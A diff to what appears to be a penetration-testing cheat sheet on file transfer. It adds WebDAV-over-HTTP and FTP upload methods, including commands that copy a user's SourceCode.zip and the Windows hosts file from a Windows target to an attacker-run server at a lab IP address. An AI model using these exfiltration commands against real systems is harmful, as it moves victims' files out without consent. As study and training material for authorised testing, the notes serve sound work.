@@ -70,6 +70,7 @@ copy n:\nc.exe
 ### FTP
 
 ```bash
+# from linux
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21
 
@@ -118,6 +119,33 @@ Invoke-FileUpload -Uri http://10.10.14.226:8000/upload -File C:\Windows\System32
 ```
 
 ### SMB
+
+- Can use when SMB is not allowed for outbound connections
+- An alternative is to run SMB over HTTP with `WebDav`
+
+```bash
+# setting up dav server on linux
+uvx --from wsgidav --with cheroot wsgidav --host 0.0.0.0 --port 80 --root "$(pwd)" --auth anonymous
+
+# from window
+# default dav root
+dir \\192.168.49.128\DavWWWRoot
+# file upload
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+
+### FTP
+
+```bash
+# from linux
+sudo python3 -m pyftpdlib --port 21 --write
+
+# from window
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+Create a command file for ftp clie
 
 ```bash
 
